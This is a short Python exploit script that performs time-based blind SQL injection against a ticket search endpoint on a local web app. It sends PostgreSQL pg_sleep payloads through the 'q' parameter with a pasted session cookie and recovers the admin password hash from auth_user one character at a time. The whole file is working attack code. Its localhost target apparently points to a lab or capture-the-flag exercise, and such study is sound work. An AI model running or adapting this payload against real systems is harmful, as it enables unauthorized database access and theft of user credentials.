import requests
import string
import time

url = "http://127.0.0.1:5001/tickets/search/"
# PASTE YOUR SESSIONID HERE:
cookies = {"sessionid": "0xdsmvs9oio085gxengbdsupzflvd1r5"} 

chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "$./_=+"
hash_value = ""

# If the response takes longer than this, the condition was TRUE.
TIME_THRESHOLD = 1.5 

print("Starting TIME-BASED blind extraction for admin password hash...")
print("This will take a few minutes. Grab a coffee.\n")

for pos in range(1, 100):
    found = False
    for c in chars:
        # PostgreSQL payload: If the character matches, sleep for 2 seconds.
        payload = (
            f"' AND (SELECT CASE WHEN (SUBSTR(password,{pos},1)='{c}') "
            f"THEN pg_sleep(2) ELSE pg_sleep(0) END FROM auth_user WHERE username='admin') IS NOT NULL-- "
        )
        
        start_time = time.time()
        r = requests.get(url, params={"q": payload}, cookies=cookies)
        elapsed = time.time() - start_time
        
        # If the request took longer than our threshold, we know it's the correct character
        if elapsed > TIME_THRESHOLD:
            hash_value += c
            print(f"[+] Position {pos}: '{c}' (took {elapsed:.2f}s) -> Current Hash: {hash_value}")
            found = True
            break
            
    if not found:
        print(f"[-] Could not find character at position {pos}. Extraction complete.")
        break

print(f"\n[!] Recovered Admin Hash (Time-Based):\n{hash_value}")